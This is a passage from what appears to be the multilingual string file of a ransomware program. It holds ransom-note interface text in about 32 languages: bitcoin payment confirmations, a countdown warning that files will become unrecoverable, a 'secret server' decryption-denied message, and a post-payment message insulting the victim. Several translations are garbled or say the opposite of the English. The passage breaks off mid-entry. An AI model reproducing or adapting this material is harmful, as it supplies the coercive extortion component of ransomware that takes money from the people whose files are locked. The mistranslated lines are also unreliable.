        "LV": "Jūs uzrakstījāt '%s'. Lūdzu, pārliecinieties, ka šī adrese ir pareiza un ka jūs esat samaksājis pareizo bitcoin summu ar to, pēc tam apstipriniet.",
        "MN": "Та '%s' гэж бичсэн. Энэ хаяг зөв байгааг шалгаж, мөн та үүнийг ашиглан зөв хэмжээний биткойн төлсөн үү гэдгийг шалгаад, дараа нь баталгаажуулна уу.",
        "NL": "Je schreef '%s'. Zorg ervoor dat dit adres juist is en dat je het juiste bedrag aan bitcoin ermee hebt betaald, en bevestig dan.",
        "PL": "Napisałeś '%s'. Upewnij się, że ten adres jest poprawny i że zapłaciłeś prawidłową kwotę bitcoin za jego pomocą, a następnie potwierdź.",
        "PT": "Você escreveu '%s'. Por favor, certifique-se de que este endereço está correto e que você pagou a quantidade correta de bitcoin com ele, e depois confirme.",
        "RO": "Ai scris '%s'. Te rog asigură-te că această adresă este corectă și că ai plătit suma corectă de bitcoin cu ea, apoi confirmă.",
        "RU": "Вы написали '%s'. Пожалуйста, убедитесь, что этот адрес правильный и что вы заплатили правильную сумму биткойнов с его помощью, затем подтвердите.",
        "SV": "Du skrev '%s'. Kontrollera att denna adress är korrekt och att du har betalat rätt belopp bitcoin med den, och bekräfta sedan.",
        "SW": "Umeandika '%s'. Tafadhali hakikisha kwamba anwani hii ni sahihi na umelipa kiasi sahihi cha bitcoin kwa hiyo, kisha thibitisha.",
        "TH": "คุณเขียนว่า '%s' กรุณาตรวจสอบให้แน่ใจว่านี่คือที่อยู่ที่ถูกต้อง และคุณได้ชำระจำนวนบิตคอยน์ที่ถูกต้องด้วย จากนั้นยืนยัน.",
        "TR": "'%s' yazdınız. Lütfen bu adresin doğru olduğundan ve bununla doğru miktarda bitcoin ödediğinizden emin olun, ardından onaylayın.",
        "UK": "Ви написали '%s'. Будь ласка, переконайтеся, що ця адреса правильна і що ви сплатили правильну суму біткойнів, після чого підтверджуйте.",
        "ZH": "您写的是 '%s'。请确保该地址正确，并且您使用该地址支付了正确数量的比特币，然后确认。"
    },

"countertitle": {
        "EN": "TIME REMAINING (before YOUR files get UNRECOVERABLE!):",
        "AR": "الوقت المتبقي (قبل أن تصبح ملفاتك غير قابلة للاسترداد!):",
        "BN": "অবশিষ্ট সময় (আপনার ফাইলগুলি পুনরুদ্ধারযোগ্য হয়ে যাওয়ার আগে!):",
        "CS": "ZBÝVAJÍCÍ ČAS (předtím, než se VAŠE soubory stanou NEOBNOVITELNÝMI!):",
        "DA": "TID TILBAGE (før DINE filer bliver UFORLADIGE!):",
        "DE": "VERBLEIBENDE ZEIT (bevor IHRE Dateien UNWIEDERBRINGLICH werden!):",
        "EL": "ΥΠΟΛΟΙΠΟΣ ΧΡΟΝΟΣ (πριν οι ΑΡΧΕΣ ΣΑΣ γίνουν ΑΝΑΚΤΗΣΙΜΕΣ!):",
        "ES": "TIEMPO RESTANTE (antes de que TUS archivos se vuelvan IRRECUPERABLES!):",
        "ET": "JÄRJESTUSE VÄLJAKUTSE (enne kui TEIE failid saavad TAASKESTAVAD!):",
        "FI": "JÄLJELLÄ OLEVA AIKA (ennen kuin TIEDOSTOSI muuttuvat PALUUUNTAUTUMATONIKSI!):",
        "FR": "TEMPS RESTANT (avant que TES fichiers soient PERDUS!):",
        "HI": "समय शेष (तुम्हारी फ़ाइलें अप्राप्य हो जाने से पहले!):",
        "HR": "OSTATKO VREMENA (prije nego što vaši datoteke postanu NEOBNOVLJIVE!):",
        "HU": "MARADÉK IDŐ (mielőtt FÁJLJAID VISSZAÉRDEMLEZHETETLENEK lesznek!):",
        "ID": "WAKTU YANG TERSISA (sebelum FILE Anda menjadi TIDAK DAPAT DIPULIHKAN!):",
        "IT": "TEMPO RIMASTO (prima che I TUOI file diventino IRRECUPERABILI!):",
        "JA": "残り時間（あなたのファイルが復元不可能になる前！）：",
        "KO": "남은 시간 (당신의 파일이 복구 불가능하게 되기 전에!):",
        "LT": "LIEKANTIS LAIKAS (prieš tai, kai JŪSŲ failai bus NEATGAUNAMI!):",
        "LV": "ATLIKUSIAIS LAIKS (pirms JŪSU faili kļūst NEATJAUNOJAMI!):",
        "MN": "Үлдсэн хугацаа (ТАНЫ файлууд БУЦААГДАГГҮЙ болохоос өмнө!):",
        "NL": "RESTANTE TIJD (voordat JE bestanden ONHERSTELBAAR worden!):",
        "PL": "CZAS POZOSTAŁY (zanim TWOJE pliki staną się NIEODWRACALNE!):",
        "PT": "TEMPO RESTANTE (antes que SEUS arquivos fiquem IRRECUPERÁVEIS!):",
        "RO": "TIMP RĂMAS (înainte ca FIȘIERELE TALE să devină NERECUPERABILE!):",
        "RU": "ОСТАЛОСЬ ВРЕМЕНИ (прежде чем ВАШИ файлы станут ВОССТАНОВИМЫМИ!):",
        "SV": "ÅTERSTÅENDE TID (innan DINA filer blir OÅTERKALLELIGA!):",
        "SW": "WAKATI ULIOBAKI (kabla FAILI ZAKO kuwa HAZITAKI TENA!):",
        "TH": "เวลาที่เหลือ (ก่อนที่ไฟล์ของคุณจะถูกลบไม่สามารถกู้คืนได้!):",
        "TR": "KALAN SÜRE (DOSYALARINIZIN KURTARILAMAZ HALE GELMESİNDEN ÖNCE!):",
        "UK": "ЧАС, ЩО ЗАЛИШАЄТЬСЯ (перш ніж ВАШІ файли стануть НЕВІДНОВЛЮВАНИМИ!):",
        "ZH": "剩余时间（在您的文件变得无法恢复之前！）："
    },

"counter": {
        "EN": "%d DAY(S)   %d HOUR(S)   %d MINUTE(S)   %d SECOND(S)",
        "AR": "%d يَوْمًا  %d سَاعَةً  %d دَقيقةً  %d ثَانيةً",
        "BN": "%d দিন(গুলো)   %d ঘন্টা(গুলো)   %d মিনিট(গুলো)   %d সেকেন্ড(গুলো)",
        "CS": "%d DEN(DNY)   %d HODIN(Y)   %d MINUT(Y)   %d SEKUND(Y)",
        "DA": "%d DAG(E)   %d TIME(R)   %d MINUT(T)   %d SEKUND(E)",
        "DE": "%d TAG(E)   %d STUNDE(N)   %d MINUTE(N)   %d SEKUNDE(N)",
        "EL": "%d ΗΜΕΡΑ(EΣ)   %d ΩΡΑ(EΣ)   %d ΛΕΠΤΟ(Α)   %d ΔΕΥΤΕΡΟ(Α)",
        "ES": "%d DÍA(S)   %d HORA(S)   %d MINUTO(S)   %d SEGUNDO(S)",
        "ET": "%d PÄEV(A)   %d TUND(I)   %d MINUT(I)   %d SEKUND(I)",
        "FI": "%d PÄIVÄ(Ä)   %d TUNT(I)   %d MINUUTTI(A)   %d SEKUNT(I)",
        "FR": "%d JOUR(S)   %d HEURE(S)   %d MINUTE(S)   %d SECONDE(S)",
        "HI": "%d दिन(ों)   %d घंटा(ों)   %d मिनट(ों)   %d सेकंड(ों)",
        "HR": "%d DAN(A)   %d SAT(I)   %d MINUT(A)   %d SEKUND(A)",
        "HU": "%d NAP(OK)   %d ÓRA(Á)   %d PERC(ET)   %d MÁSODPERC(ET)",
        "ID": "%d HARI   %d JAM   %d MENIT   %d DETIK",
        "IT": "%d GIORNO/I   %d ORA/E   %d MINUTO/I   %d SECONDO/I",
        "JA": "%d 日   %d 時間   %d 分   %d 秒",
        "KO": "%d 일   %d 시간   %d 분   %d 초",
        "LT": "%d DIENA(Ų)   %d VALANDA(Ų)   %d MINUT(Ų)   %d SEKUND(Ž)",
        "LV": "%d DIENA(S)   %d STUND(A)   %d MINŪTE(S)   %d SEKUND(E)",
        "MN": "%d ӨДӨР(Ү)   %d ЦАГ(ИЙН)   %d МИНУТ(ИЙН)   %d СЕКУНД(ИЙН)",
        "NL": "%d DAG(EN)   %d UUR(EN)   %d MINUUT(EN)   %d SECOND(EN)",
        "PL": "%d DZIEŃ(DNI)   %d GODZINA(Y)   %d MINUTA(Y)   %d SEKUNDA(Y)",
        "PT": "%d DIA(S)   %d HORA(S)   %d MINUTO(S)   %d SEGUNDO(S)",
        "RO": "%d ZI(LE)   %d ORĂ(E)   %d MINUT(E)   %d SECUND(E)",
        "RU": "%d ДЕНЬ(ДНЯ)   %d ЧАС(А)   %d МИНУТА(Ы)   %d СЕКУНД(Ы)",
        "SV": "%d DAG(AR)   %d TIMME(AR)   %d MINUT(ER)   %d SEKUND(ER)",
        "SW": "%d SIKU   %d Saa   %d Dakika   %d Sekunde",
        "TH": "%d วัน   %d ชั่วโมง   %d นาที   %d วินาที",
        "TR": "%d GÜN   %d SAAT   %d DAKİKA   %d SANİYE",
        "UK": "%d ДЕНЬ(ДНІ)   %d ГОДИНА(ГОДИНИ)   %d ХВИЛИНА(ХВИЛИНИ)   %d СЕКУНДА(СЕКУНДИ)",
        "ZH": "%d 天   %d 小时   %d 分钟   %d 秒"
    },
    "counterdate": {
        "EN": "All files will be lost on %s/%s/%s at %s:%s:%s",
        "AR": "ستفقد جميع الملفات في %s/%s/%s في %s:%s:%s",
        "BN": "সব ফাইল %s/%s/%s তারিখে %s:%s:%s এ হারিয়ে যাবে",
        "CS": "Všechny soubory budou ztraceny dne %s/%s/%s v %s:%s:%s",
        "DA": "Alle filer vil gå tabt den %s/%s/%s kl. %s:%s:%s",
        "DE": "Alle Dateien gehen am %s/%s/%s um %s:%s:%s verloren",
        "EL": "Όλα τα αρχεία θα χαθούν στις %s/%s/%s στις %s:%s:%s",
        "ES": "Todos los archivos se perderán el %s/%s/%s a las %s:%s:%s",
        "ET": "Kõik failid kaovad %s/%s/%s kell %s:%s:%s",
        "FI": "Kaikki tiedostot häviävät %s/%s/%s klo %s:%s:%s",
        "FR": "Tous les fichiers seront perdus le %s/%s/%s à %s:%s:%s",
        "HI": "सभी फ़ाइलें %s/%s/%s को %s:%s:%s पर खो जाएंगी",
        "HR": "Sve datoteke bit će izgubljene %s/%s/%s u %s:%s:%s",
        "HU": "Minden fájl el fog veszni %s/%s/%s-én %s:%s:%s-kor",
        "ID": "Semua file akan hilang pada %s/%s/%s pada %s:%s:%s",
        "IT": "Tutti i file saranno persi il %s/%s/%s alle %s:%s:%s",
        "JA": "すべてのファイルは %s/%s/%s の %s:%s:%s に失われます",
        "KO": "모든 파일은 %s/%s/%s %s:%s:%s에 손실됩니다",
        "LT": "Visi failai bus prarasti %s/%s/%s %s:%s:%s",
        "LV": "Visi faili tiks zaudēti %s/%s/%s plkst. %s:%s:%s",
        "MN": "Бүх файлууд %s/%s/%s-нд %s:%s:%s-д алга болно",
        "NL": "Alle bestanden gaan verloren op %s/%s/%s om %s:%s:%s",
        "PL": "Wszystkie pliki zostaną utracone %s/%s/%s o %s:%s:%s",
        "PT": "Todos os arquivos serão perdidos em %s/%s/%s às %s:%s:%s",
        "RO": "Toate fișierele vor fi pierdute pe %s/%s/%s la %s:%s:%s",
        "RU": "Все файлы будут утеряны %s/%s/%s в %s:%s:%s",
        "SV": "Alla filer kommer att gå förlorade den %s/%s/%s klockan %s:%s:%s",
        "SW": "Mafaili yote yatapotezwa %s/%s/%s saa %s:%s:%s",
        "TH": "ไฟล์ทั้งหมดจะสูญหายในวันที่ %s/%s/%s เวลา %s:%s:%s",
        "TR": "Tüm dosyalar %s/%s/%s tarihinde %s:%s:%s' de kaybolacaktır.",
        "UK": "Усі файли будуть втрачені %s/%s/%s о %s:%s:%s",
        "ZH": "所有文件将在 %s/%s/%s 的 %s:%s:%s 丢失"
    },
   "counterfinish": {
        "EN": "!!!DONE!!!",
        "AR": "!!!مكتمل!!!",
        "BN": "!!!সম্পন্ন!!!",
        "CS": "!!!HOTOVO!!!",
        "DA": "!!!FÆRDIG!!!",
        "DE": "!!!FERTIG!!!",
        "EL": "!!!ΕΓΚΕΚΡΙΜΕΝΟ!!!",
        "ES": "!!!HECHO!!!",
        "ET": "!!!VALMIS!!!",
        "FI": "!!!VALMIS!!!",
        "FR": "!!!TERMINÉ!!!",
        "HI": "!!!पूर्ण!!!",
        "HR": "!!!ZAVRŠENO!!!",
        "HU": "!!!KÉSZ!!!",
        "ID": "!!!SELESAI!!!",
        "IT": "!!!FATTO!!!",
        "JA": "!!!完了!!!",
        "KO": "!!!완료!!!",
        "LT": "!!!BAIGTA!!!",
        "LV": "!!!GATAVS!!!",
        "MN": "!!!БҮРЭН!!!",
        "NL": "!!!KLAAR!!!",
        "PL": "!!!ZROBIONE!!!",
        "PT": "!!!FEITO!!!",
        "RO": "!!!FINALIZAT!!!",
        "RU": "!!!ГОТОВО!!!",
        "SV": "!!!KLAR!!!",
        "SW": "!!!IMEKAMILIKA!!!",
        "TH": "!!!เสร็จสิ้น!!!",
        "TR": "!!!TAMAM!!!",
        "UK": "!!!ГОТОВО!!!",
        "ZH": "!!!完成!!!"
    },
    "deniedtitle": {
        "EN": "Decryption Denied",
        "AR": "فك التشفير مرفوض",
        "BN": "ডিক্রিপশন অস্বীকৃত",
        "CS": "Dešifrování zamítnuto",
        "DA": "Dekryptering nægtet",
        "DE": "Entschlüsselung abgelehnt",
        "EL": "Απόρριψη αποκρυπτογράφησης",
        "ES": "Desencriptación denegada",
        "ET": "Dekrüpteerimine keelatud",
        "FI": "Purku kielletty",
        "FR": "Décryptage refusé",
        "HI": "डिक्रिप्शन अस्वीकृत",
        "HR": "Dešifriranje odbijeno",
        "HU": "Dekódolás megtagadva",
        "ID": "Dekripsi Ditolak",
        "IT": "Decrittazione negata",
        "JA": "復号が拒否されました",
        "KO": "복호화가 거부되었습니다",
        "LT": "Dešifravimas atmestas",
        "LV": "Atšifrēšana noraidīta",
        "MN": "Тайлагдсан нь татгалзсан",
        "NL": "Dekriptie geweigerd",
        "PL": "Odszyfrowanie odmówione",
        "PT": "Decryption Denied",
        "RO": "Decriptarea refuzată",
        "RU": "Расшифровка отказана",
        "SV": "Dekryptering nekad",
        "SW": "Kufichua kukataliwa",
        "TH": "การถอดรหัสถูกปฏิเสธ",
        "TR": "Şifre çözme reddedildi",
        "UK": "Розшифрування відмовлено",
        "ZH": "解密被拒绝"
    },
    "denied": {
        "EN": "The secret server has denied your request to decrypt the files. Check that: You are currently connected to Internet, You have paid the correct amount of bitcoin, The transaction was confirmed, You wrote the correct bitcoin address (YOUR address, not ours). If these steps are completed, please wait at least 1 hour (if you have enough time) and try again.",
        "AR": "لقد رفض الخادم السري طلبك لفك تشفير الملفات. تحقق من: أنك متصل حاليًا بالإنترنت، أنك دفعت المبلغ الصحيح من البيتكوين، تم تأكيد المعاملة، كتبت العنوان الصحيح للبيتكوين (عنوانك، وليس عنواننا). إذا تم استيفاء هذه الخطوات، يرجى الانتظار لمدة ساعة على الأقل (إذا كان لديك ما يكفي من الوقت) وحاول مرة أخرى.",
        "BN": "গোপন সার্ভার আপনার ফাইলগুলি ডিক্রিপ্ট করার অনুরোধটি অস্বীকার করেছে। নিশ্চিত করুন: আপনি বর্তমানে ইন্টারনেট সংযুক্ত, আপনি সঠিক পরিমাণ বিটকয়েন পরিশোধ করেছেন, লেনদেন নিশ্চিত করা হয়েছে, আপনি সঠিক বিটকয়েন ঠিকানা লিখেছেন (আপনার ঠিকানা, আমাদের নয়)। যদি এই পদক্ষেপগুলি সম্পন্ন হয়, তবে দয়া করে অন্তত 1 ঘন্টা অপেক্ষা করুন (যদি আপনার যথেষ্ট সময় থাকে) এবং আবার চেষ্টা করুন।",
        "CS": "Tajný server odmítl vaši žádost o dešifrování souborů. Zkontrolujte, zda: Jste aktuálně připojeni k internetu, zaplatili jste správnou částku bitcoinů, transakce byla potvrzena, napsali jste správnou bitcoinovou adresu (VAŠE adresa, ne naše). Pokud jsou tyto kroky splněny, počkejte prosím alespoň 1 hodinu (pokud máte dost času) a zkuste to znovu.",
        "DA": "Den hemmelige server har nægtet din anmodning om at dekryptere filerne. Kontroller, at: Du i øjeblikket er tilsluttet internettet, Du har betalt det korrekte beløb i bitcoin, Transaktionen blev bekræftet, Du har skrevet den korrekte bitcoin-adresse (DIN adresse, ikke vores). Hvis disse trin er gennemført, skal du vente mindst 1 time (hvis du har tid nok) og prøve igen.",
        "DE": "Der geheime Server hat Ihre Anfrage zur Entschlüsselung der Dateien abgelehnt. Überprüfen Sie, ob: Sie derzeit mit dem Internet verbunden sind, Sie den richtigen Betrag an Bitcoin bezahlt haben, die Transaktion bestätigt wurde, Sie die richtige Bitcoin-Adresse eingegeben haben (IHRE Adresse, nicht unsere). Wenn diese Schritte abgeschlossen sind, warten Sie bitte mindestens 1 Stunde (wenn Sie genügend Zeit haben) und versuchen Sie es erneut.",
        "EL": "Ο μυστικός διακομιστής έχει αρνηθεί το αίτημά σας να αποκρυπτογραφήσετε τα αρχεία. Ελέγξτε ότι: Είστε αυτή τη στιγμή συνδεδεμένοι στο Διαδίκτυο, έχετε πληρώσει το σωστό ποσό bitcoin, η συναλλαγή έχει επιβεβαιωθεί, έχετε γράψει τη σωστή διεύθυνση bitcoin (Η ΔΙΕΥΘΥΝΣΗ ΣΑΣ, όχι η δική μας). Εάν αυτά τα βήματα έχουν ολοκληρωθεί, παρακαλώ περιμένετε τουλάχιστον 1 ώρα (αν έχετε αρκετό χρόνο) και δοκιμάστε ξανά.",
        "ES": "El servidor secreto ha denegado su solicitud para descifrar los archivos. Verifique que: está conectado a Internet, ha pagado la cantidad correcta de bitcoin, la transacción fue confirmada, escribió la dirección de bitcoin correcta (SU dirección, no la nuestra). Si estos pasos se completan, espere al menos 1 hora (si tiene suficiente tiempo) y vuelva a intentarlo.",
        "ET": "Salajane server on teie faili dekrüpteerimise taotluse tagasi lükanud. Kontrollige, et: olete praegu Internetiga ühendatud, olete maksnud õige summa bitcoine, tehing on kinnitatud, olete kirjutanud õige bitcoini aadressi (TEIE aadress, mitte meie). Kui need sammud on täidetud, oodake palun vähemalt 1 tund (kui teil on piisavalt aega) ja proovige uuesti.",
        "FI": "Salainen palvelin on hylännyt pyyntösi tiedostojen purkamisesta. Tarkista, että: Olet tällä hetkellä yhteydessä Internetiin, Olet maksanut oikean määrän bitcoineja, Transaktio on vahvistettu, Olet kirjoittanut oikean bitcoin-osoitteen (OMAN osoitteesi, ei meidän). Jos nämä vaiheet on suoritettu, odota vähintään 1 tunti (jos sinulla on tarpeeksi aikaa) ja yritä uudelleen.",
        "FR": "Le serveur secret a refusé votre demande de déchiffrer les fichiers. Vérifiez que : Vous êtes actuellement connecté à Internet, Vous avez payé le montant correct en bitcoin, La transaction a été confirmée, Vous avez écrit la bonne adresse bitcoin (VOTRE adresse, pas la nôtre). Si ces étapes sont complètes, veuillez attendre au moins 1 heure (si vous avez suffisamment de temps) et réessayez.",
        "HI": "गोपनीय सर्वर ने फ़ाइलों को डिक्रिप्ट करने के लिए आपके अनुरोध को अस्वीकृत कर दिया है। सुनिश्चित करें कि: आप वर्तमान में इंटरनेट से जुड़े हैं, आपने सही मात्रा में बिटकॉइन का भुगतान किया है, लेन-देन की पुष्टि हो गई है, आपने सही बिटकॉइन पता लिखा है (आपका पता, हमारा नहीं)। यदि ये कदम पूरे हो गए हैं, तो कृपया कम से कम 1 घंटे तक प्रतीक्षा करें (यदि आपके पास पर्याप्त समय है) और फिर से प्रयास करें।",
        "HR": "Tajni poslužitelj je odbio vaš zahtjev za dešifriranje datoteka. Provjerite: Trenutno ste povezani na Internet, Platili ste točan iznos bitcoina, Transakcija je potvrđena, Napisali ste ispravnu bitcoin adresu (VAŠA adresa, ne naša). Ako su ti koraci dovršeni, molimo vas da pričekate najmanje 1 sat (ako imate dovoljno vremena) i pokušate ponovno.",
        "HU": "A titkos szerver elutasította a fájlok dekódolására vonatkozó kérését. Ellenőrizze, hogy: Jelenleg csatlakozik az Internethez, Kifizette a megfelelő mennyiségű bitcoint, A tranzakciót megerősítették, A helyes bitcoin címet írta be (AZ ÖN címe, nem a miénk). Ha ezek a lépések befejeződtek, kérjük, várjon legalább 1 órát (ha van elég ideje), és próbálja újra.",
        "ID": "Server rahasia telah menolak permintaan Anda untuk mendekripsi file. Periksa bahwa: Anda saat ini terhubung ke Internet, Anda telah membayar jumlah bitcoin yang benar, Transaksi telah dikonfirmasi, Anda telah menulis alamat bitcoin yang benar (ALAMAT ANDA, bukan alamat kami). Jika langkah-langkah ini telah diselesaikan, harap tunggu setidaknya 1 jam (jika Anda memiliki cukup waktu) dan coba lagi.",
        "IT": "Il server segreto ha negato la tua richiesta di decrittare i file. Controlla che: sei attualmente connesso a Internet, hai pagato l'importo corretto di bitcoin, la transazione è stata confermata, hai scritto l'indirizzo bitcoin corretto (IL TUO indirizzo, non il nostro). Se questi passaggi sono stati completati, attendi almeno 1 ora (se hai abbastanza tempo) e riprova.",
        "JA": "秘密のサーバーは、ファイルを復号するリクエストを拒否しました。次のことを確認してください: 現在インターネットに接続されている、正しい金額のビットコインを支払った、トランザクションが確認された、正しいビットコインアドレスを書いた（あなたのアドレス、私たちのではありません）。これらの手順が完了したら、少なくとも1時間待って（十分な時間がある場合）再度お試しください。",
        "KO": "비밀 서버가 파일 복호화 요청을 거부했습니다. 확인하십시오: 현재 인터넷에 연결되어 있으며, 올바른 금액의 비트코인을 지불했으며, 거래가 확인되었으며, 올바른 비트코인 주소(귀하의 주소, 우리의 주소가 아님)를 작성했습니다. 이러한 단계를 완료했다면 최소 1시간 기다렸다가(시간이 충분하다면) 다시 시도하십시오.",
        "LT": "Slaptasis serveris atmetė jūsų prašymą dešifruoti failus. Patikrinkite, ar: Šiuo metu esate prisijungę prie Interneto, sumokėjote teisingą bitcoin sumą, operacija buvo patvirtinta, įvedėte teisingą bitcoin adresą (JŪSŲ adresą, o ne mūsų). Jei šie žingsniai buvo atlikti, palaukite mažiausiai 1 valandą (jei turite pakankamai laiko) ir bandykite dar kartą.",
        "LV": "Slepenais serveris ir noraidījis jūsu pieprasījumu atšifrēt failus. Pārbaudiet, vai: pašlaik esat pieslēgts internetam, esat samaksājis pareizo bitcoin summu, darījums ir apstiprināts, esat uzrakstījis pareizo bitcoin adresi (JŪSU adrese, nevis mūsu). Ja šie soļi ir izpildīti, gaidiet vismaz 1 stundu (ja jums ir pietiekami daudz laika) un mēģiniet vēlreiz.",
        "MN": "Нууц сервер таны файлуудыг тайлах хүсэлтийг татгалзсан. Баталгаажуулах: Та одоо Интернетэд холбогдсон, та зөв хэмжээний биткойн төлсөн, гүйлгээ баталгаажсан, та зөв биткойн хаягийг бичсэн (ТАНЫ хаяг, манайх биш). Эдгээр алхмуудыг гүйцэтгэсэн бол дор хаяж 1 цаг хүлээгээрэй (хэрвээ та хангалттай хугацаа байгаа бол) дахин оролдоно уу.",
        "NL": "De geheime server heeft uw verzoek om de bestanden te decrypteren geweigerd. Controleer of: u momenteel met het internet bent verbonden, u het juiste bedrag aan bitcoin heeft betaald, de transactie is bevestigd, u het juiste bitcoin-adres heeft geschreven (UW adres, niet het onze). Als deze stappen zijn voltooid, wacht dan minstens 1 uur (als u genoeg tijd heeft) en probeer het opnieuw.",
        "PL": "Tajny serwer odrzucił twoją prośbę o odszyfrowanie plików. Sprawdź, czy: obecnie jesteś połączony z Internetem, zapłaciłeś właściwą kwotę bitcoinów, transakcja została potwierdzona, wpisałeś poprawny adres bitcoin (TWÓJ adres, nie nasz). Jeśli te kroki są zakończone, poczekaj co najmniej 1 godzinę (jeśli masz wystarczająco dużo czasu) i spróbuj ponownie.",
        "PT": "O servidor secreto negou seu pedido para descriptografar os arquivos. Verifique se: você está atualmente conectado à Internet, você pagou a quantia correta de bitcoin, a transação foi confirmada, você escreveu o endereço bitcoin correto (SEU endereço, não o nosso). Se esses passos foram concluídos, aguarde pelo menos 1 hora (se você tiver tempo suficiente) e tente novamente.",
        "RO": "Serverul secret ți-a refuzat cererea de a decripta fișierele. Verifică că: ești conectat la Internet, ai plătit suma corectă de bitcoin, tranzacția a fost confirmată, ai scris adresa corectă de bitcoin (ADRESA TA, nu a noastră). Dacă aceste etape sunt completate, te rugăm să aștepți cel puțin 1 oră (dacă ai suficient timp) și să încerci din nou.",
        "RU": "Секретный сервер отклонил ваш запрос на расшифровку файлов. Проверьте, что: вы в настоящее время подключены к Интернету, вы оплатили правильную сумму биткойнов, транзакция была подтверждена, вы написали правильный биткойн-адрес (ВАШ адрес, а не наш). Если эти шаги выполнены, подождите не менее 1 часа (если у вас достаточно времени) и попробуйте снова.",
        "SV": "Den hemliga servern har avvisat din begäran om att dekryptera filerna. Kontrollera att: du för närvarande är ansluten till Internet, du har betalat rätt belopp i bitcoin, transaktionen har bekräftats, du har skrivit den korrekta bitcoin-adressen (DIN adress, inte vår). Om dessa steg är slutförda, vänligen vänta minst 1 timme (om du har tillräckligt med tid) och försök igen.",
        "SW": "Kikundi cha siri kimekataa ombi lako la kufichua faili. Hakiki kuwa: kwa sasa umeunganishwa na mtandao, umeweza kulipa kiasi sahihi cha bitcoin, muamala umehakikishwa, umeandika anwani sahihi ya bitcoin (ANWANI YAKO, sio yetu). Ikiwa hatua hizi zimekamilika, tafadhali subiri angalau saa 1 (ikiwa una muda wa kutosha) na ujaribu tena.",
        "TH": "เซิร์ฟเวอร์ลับปฏิเสธคำขอของคุณในการถอดรหัสไฟล์ ตรวจสอบว่า: คุณเชื่อมต่ออินเทอร์เน็ตอยู่ในขณะนี้ คุณได้ชำระจำนวนบิตคอยน์ที่ถูกต้องแล้ว การทำธุรกรรมได้รับการยืนยันแล้ว คุณได้เขียนที่อยู่บิตคอยน์ที่ถูกต้อง (ที่อยู่ของคุณ ไม่ใช่ของเรา) หากขั้นตอนเหล่านี้เสร็จสมบูรณ์แล้ว กรุณารออย่างน้อย 1 ชั่วโมง (ถ้าคุณมีเวลาเพียงพอ) และลองอีกครั้ง",
        "TR": "Gizli sunucu dosyaları şifre çözme isteğinizi reddetti. Kontrol edin: Şu anda İnternete bağlısınız, Doğru miktarda bitcoin ödediniz, İşlem onaylandı, Doğru bitcoin adresini yazdınız (SİZİN adresiniz, bizim değil). Bu adımlar tamamlandıysa, lütfen en az 1 saat bekleyin (yeterince zamanınız varsa) ve tekrar deneyin.",
        "UK": "Секретний сервер відмовив у вашому запиті на розшифрування файлів. Перевірте, що: Ви зараз підключені до Інтернету, Ви сплатили правильну суму біткоїнів, Транзакцію було підтверджено, Ви написали правильну адресу біткоїнів (ВАША адреса, а не наша). Якщо ці кроки виконані, будь ласка, почекайте щонайменше 1 годину (якщо у вас достатньо часу) і спробуйте ще раз.",
        "ZH": "秘密服务器拒绝了您解密文件的请求。请检查：您当前已连接到互联网，您已支付正确数量的比特币，交易已确认，您写下了正确的比特币地址（您的地址，而不是我们的）。如果这些步骤完成，请至少等待1小时（如果您有足够的时间）再试一次。"
    },
    "filesdecryptedtitle": {
        "EN": "Files decrypted!",
        "AR": "تم فك تشفير الملفات!",
        "BN": "ফাইলগুলো ডিক্রিপ্ট করা হয়েছে!",
        "CS": "Soubory dešifrovány!",
        "DA": "Filer dekrypteret!",
        "DE": "Dateien entschlüsselt!",
        "EL": "Αρχεία αποκρυπτογραφημένα!",
        "ES": "¡Archivos desencriptados!",
        "ET": "Failid dekrüpteeritud!",
        "FI": "Tiedostot salauksen purettu!",
        "FR": "Fichiers décryptés !",
        "HI": "फाइलें डिक्रिप्ट की गईं!",
        "HR": "Datoteke dešifrirane!",
        "HU": "Fájlok dekódolva!",
        "ID": "File telah didekripsi!",
        "IT": "File decrittati!",
        "JA": "ファイルが復号されました！",
        "KO": "파일이 복호화되었습니다!",
        "LT": "Failai dešifruoti!",
        "LV": "Faili atšifrēti!",
        "MN": "Файлууд тайлагдсан!",
        "NL": "Bestanden gedecodeerd!",
        "PL": "Pliki odszyfrowane!",
        "PT": "Arquivos descriptografados!",
        "RO": "Fișiere decriptate!",
        "RU": "Файлы расшифрованы!",
        "SV": "Filer dekrypterade!",
        "SW": "Mafaili yamefichuliwa!",
        "TH": "ถอดรหัสไฟล์เสร็จสิ้น!",
        "TR": "Dosyalar şifresi çözüldü!",
        "UK": "Файли розшифровані!",
        "ZH": "文件已解密！"
    },
    "filesdecrypted": {
        "EN": "All your files have been decrypted. Thanks for the money bitch.",
        "AR": "تم فك تشفير جميع ملفاتك. شكرًا على المال، عزيزي.",
        "BN": "আপনার সমস্ত ফাইল ডিক্রিপ্ট করা হয়েছে। টাকা দেওয়ার জন্য ধন্যবাদ, বাচ্চা।",
        "CS": "Všechny vaše soubory byly dešifrovány. Děkujeme za peníze, ty krávo.",
        "DA": "Alle dine filer er blevet dekrypteret. Tak for pengene, din kæde.",
        "DE": "Alle Ihre Dateien wurden entschlüsselt. Danke für das Geld, Miststück.",
        "EL": "Όλα τα αρχεία σας έχουν αποκρυπτογραφηθεί. Ευχαριστώ για τα χρήματα, μωρό.",
        "ES": "Todos tus archivos han sido descifrados. Gracias por el dinero, perra.",
        "ET": "Kõik teie failid on dekrüpteeritud. Aitäh raha eest, lits.",
        "FI": "Kaikki tiedostosi on salauksen purkamiseksi. Kiitos rahasta, narttu.",
        "FR": "Tous vos fichiers ont été décryptés. Merci pour l'argent, espèce de salope.",
        "HI": "आपकी सभी फ़ाइलें डिक्रिप्ट कर दी गई हैं। पैसे के लिए धन्यवाद, कुतिया।",
        "HR": "Sve vaše datoteke su dešifrirane. Hvala na novcu, kučko.",
        "HU": "Minden fájlod dekódolva lett. Köszönöm a pénzt, te ribanc.",
        "ID": "Semua file Anda telah didekripsi. Terima kasih atas uangnya, brengsek.",
        "IT": "Tutti i tuoi file sono stati decrittati. Grazie per i soldi, stronza.",
        "JA": "あなたのすべてのファイルは復号されました。お金をありがとう、クソ女。",
        "KO": "모든 파일이 복호화되었습니다. 돈을 주셔서 감사합니다, 이년아.",
        "LT": "Visi jūsų failai buvo dešifruoti. Ačiū už pinigus, kekše.",
        "LV": "Visi jūsu faili ir dešifrēti. Paldies par naudu, kuce.",
        "MN": "Таны бүх файлууд тайлагдсан. Мөнгөний төлөө баярлалаа, муу охин.",
        "NL": "Al je bestanden zijn gedecodeerd. Bedankt voor het geld, bitch.",
        "PL": "Wszystkie twoje pliki zostały odszyfrowane. Dzięki za pieniądze, suko.",
